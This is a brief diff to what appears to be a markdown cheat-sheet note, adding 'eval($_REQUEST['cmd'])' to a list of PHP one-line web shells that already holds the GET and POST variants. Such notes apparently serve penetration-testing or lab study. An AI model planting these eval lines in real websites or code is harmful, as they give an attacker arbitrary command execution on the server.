@@ -8,6 +8,7 @@ tags:
 ```php
 eval($_GET["cmd"]);
 eval($_POST["cmd"]);
+eval($_REQUEST['cmd']);
 ```
 
 ---
